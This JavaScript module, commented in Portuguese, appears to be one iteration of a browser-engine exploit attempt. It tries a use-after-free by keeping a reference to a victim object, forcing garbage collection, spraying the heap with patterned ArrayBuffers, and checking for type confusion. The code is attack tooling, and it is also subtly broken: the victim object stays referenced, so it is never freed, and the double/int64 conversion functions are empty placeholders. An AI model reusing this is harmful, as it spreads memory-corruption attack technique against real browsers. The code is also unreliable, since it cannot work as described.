// js/script3/testArrayBufferVictimCrash.mjs (v128 - GC Aprimorado e Vítima Simplificada)
// =======================================================================================
// LOG DE ALTERAÇÕES:
// - DIAGNÓSTICO: O GC não estava liberando o objeto vítima.
// - CORREÇÃO 1: O objeto 'victim' foi simplificado para conter apenas números primitivos,
//   replicando a estrutura do v82 que originalmente causou o crash e facilitando a coleta.
// - CORREÇÃO 2: A função triggerGC_Hyper foi aprimorada para criar e descartar muitos
//   objetos pequenos, aumentando a pressão sobre o Garbage Collector.
// =======================================================================================

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex } from '../utils.mjs';

export const FNAME_MODULE_FINAL = "UAF_v128_ImprovedGC";

// --- Funções de Conversão (Double <-> Int64) ---
function int64ToDouble(int64) { /* ...código sem alterações... */ }
function doubleToInt64(double) { /* ...código sem alterações... */ }

// --- Funções Auxiliares para a Cadeia de Exploração UAF ---

// #MODIFICADO: GC agora cria mais "lixo" para aumentar a pressão.
async function triggerGC_Hyper() {
    logS3("    Acionando GC Aprimorado...", "info");
    try {
        for (let i = 0; i < 1000; i++) {
            // Aloca memória de tamanhos variados
            new ArrayBuffer(1024 * i);
            // Cria e descarta objetos para gerar "lixo"
            new Array(1024).fill({a: i});
        }
    } catch (e) {
        logS3("    Memória esgotada durante o GC, como esperado.", "info");
    }
    await PAUSE_S3(250);
}

// #MODIFICADO: A vítima agora é idêntica à do v82, usando apenas primitivos.
function createDanglingPointer() {
    logS3("    Criando objeto vítima simplificado (apenas números).", "info");
    let dangling_ref_internal = null;
    function createScope() {
        const victim = {
            p1: 0.1, p2: 0.2, p3: 0.3, p4: 0.4, p5: 0.5,
            p6: 0.6, p7: 0.7, p8: 0.8, p9: 0.9, p10: 0.11,
            p11: 0.12, p12: 0.13, p13: 0.14, p14: 0.15, p15: 0.16,
            p16: 0.17,
            corrupted_prop: 13.37 // Propriedade alvo é um número primitivo (double)
        };
        dangling_ref_internal = victim;
    }
    createScope();
    return dangling_ref_internal;
}


// =======================================================================================
// FUNÇÃO ORQUESTRADORA PRINCIPAL
// =======================================================================================
export async function runFinalUnifiedTest() {
    const FNAME_CURRENT_TEST_BASE = FNAME_MODULE_FINAL;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Tentativa de UAF com GC Aprimorado ---`, "test");

    let final_result = { success: false, message: "A cadeia UAF não obteve sucesso." };
    let spray_buffers = [];

    try {
        // --- FASE 1: Criar o Ponteiro Pendurado ---
        logS3("--- FASE 1: Criando um ponteiro pendurado... ---", "subtest");
        const dangling_ref = createDanglingPointer();
        logS3("    Ponteiro pendurado criado.", "warn");

        // --- FASE 2: Forçar a Coleta de Lixo ---
        logS3("--- FASE 2: Múltiplas chamadas de GC para garantir a liberação ---", "subtest");
        await triggerGC_Hyper();
        await triggerGC_Hyper();
        logS3("    Memória do objeto-alvo deveria ter sido liberada.", "warn");

        // --- FASE 3: Pulverizar o heap para reocupar a memória liberada ---
        logS3("--- FASE 3: Pulverizando ArrayBuffers sobre a memória liberada... ---", "subtest");
        for (let i = 0; i < 2048; i++) {
            const buf = new ArrayBuffer(136);
            const view = new BigUint64Array(buf);
            view[0] = 0x4141414141414141n; 
            view[1] = 0x4242424242424242n;
            spray_buffers.push(buf);
        }
        logS3(`    Pulverização de ${spray_buffers.length} buffers concluída.`, "info");
        
        // --- FASE 4: Verificar a Confusão de Tipos ---
        logS3("--- FASE 4: Verificando a confusão de tipos... ---", "subtest");
        
        try {
            const prop = dangling_ref.corrupted_prop;
            const prop_type = typeof prop;
            logS3(`[VERIFICAÇÃO] O tipo da propriedade é agora: '${prop_type}'`, "leak");

            if (prop_type === 'number' && prop !== 13.37) {
                logS3("++++++++++++ SUCESSO! CONFUSÃO DE TIPOS VIA UAF OCORREU! ++++++++++++", "vuln");
                const leaked_bits = doubleToInt64(prop);
                logS3(`Bits vazados da propriedade: ${toHex(leaked_bits)}`, "leak");
                
                if (leaked_bits.high() === 0x41414141 && leaked_bits.low() === 0x41414141) {
                    logS3("CONFIRMADO: Os bits vazados correspondem ao padrão de spray!", "vuln");
                    final_result = { success: true, message: "Controle de memória via UAF confirmado." };
                } else {
                    final_result = { success: true, message: `TC ocorreu, mas os bits (${toHex(leaked_bits)}) não correspondem ao padrão.` };
                }
            } else {
                 throw new Error(`Falha no UAF. Tipo '${prop_type}' e valor '${prop}' inesperados.`);
            }
        } catch(e) {
            logS3(`Ocorreu um erro ao acessar a propriedade pendurada: ${e.message}`, "error");
            throw new Error("Acesso à memória pendurada falhou, mas foi capturado.");
        }

    } catch (e) {
        final_result.message = `Exceção na cadeia UAF: ${e.message}`;
        logS3(final_result.message, "critical");
        console.error(e);
    }

    logS3(`--- ${FNAME_CURRENT_TEST_BASE} Concluído ---`, "test");
    return final_result;
}
